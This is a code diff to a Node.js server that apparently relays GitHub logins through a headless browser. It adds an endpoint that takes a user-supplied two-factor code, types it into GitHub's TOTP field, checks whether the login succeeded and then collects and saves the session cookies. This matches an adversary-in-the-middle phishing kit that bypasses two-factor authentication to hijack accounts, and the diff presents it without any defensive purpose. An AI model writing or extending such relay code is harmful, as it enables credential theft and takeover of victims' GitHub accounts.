@@ -270,6 +270,12 @@ app.post("/api/login", async (req, res) => {
       html.includes("We just sent your authentication code via email to")
     ) {
       result = 1;
+    } else if (
+      html.includes(
+        "Enter the code from your two-factor authentication app or browser extension below."
+      )
+    ) {
+      result = 4;
     } else {
       // Navigated away from /login to github.com (e.g. successful login)
       try {
@@ -418,6 +424,97 @@ app.post("/api/verified-device", async (req, res) => {
     return res.status(500).json({
       success: false,
       error: "Internal server error during device verification process",
+      details: error.message,
+    });
+  }
+});
+
+// ----------------- Two-factor (TOTP) endpoint -----------------
+app.post("/api/two-factor", async (req, res) => {
+  const { code, sessionId } = req.body;
+
+  if (!code || !sessionId) {
+    return res.status(400).json({
+      success: false,
+      error: !code ? "2FA code is required" : "Session ID is required",
+    });
+  }
+
+  const session = getSession(sessionId);
+
+  if (!session || !session.page) {
+    return res.status(404).json({
+      success: false,
+      error: "Active session not found for provided sessionId",
+    });
+  }
+
+  const { page } = session;
+
+  try {
+    console.log(`Submitting 2FA code for session: ${sessionId}`);
+
+    if (typeof page.bringToFront === "function") {
+      try {
+        await page.bringToFront();
+      } catch (e) {}
+    }
+
+    await page.waitForSelector("#app_totp", {
+      visible: true,
+      timeout: 20000,
+    });
+
+    await page.click("#app_totp", { clickCount: 3 });
+    await page.type("#app_totp", String(code), { delay: 50 });
+
+    // await page.click('form[action*="two-factor"] button[type="submit"]');
+
+    console.log(
+      `2FA code filled for session ${sessionId}. Will evaluate result in 10 seconds.`,
+    );
+    await delay(10000);
+
+    const html = await page.content();
+    const pageUrl = page.url();
+
+    let result = null;
+
+    if (
+      html.includes("Two-factor authentication failed")
+    ) {
+      result = 0;
+      console.log(`[session ${sessionId}] 2FA incorrect code (result=0)`);
+    } else {
+      try {
+        const url = new URL(pageUrl);
+        const isBareGithub =
+          url.hostname === "github.com" &&
+          (url.pathname === "/" || url.pathname === "");
+
+        if (isBareGithub) {
+          result = 1;
+          console.log(`[session ${sessionId}] 2FA success, landed on github.com`);
+          setImmediate(() => {
+            collectAndSaveCookies(sessionId).catch((e) =>
+              console.error("collectAndSaveCookies failed after 2FA:", e),
+            );
+          });
+        }
+      } catch (e) {}
+    }
+
+    return res.json({
+      success: true,
+      message: "2FA code submitted on GitHub",
+      sessionId,
+      result,
+    });
+  } catch (error) {
+    console.error("Error during 2FA process:", error);
+    return res.status(500).json({
+      success: false,
+      error: "Internal server error during 2FA process",
       details: error.message,
     });
   }
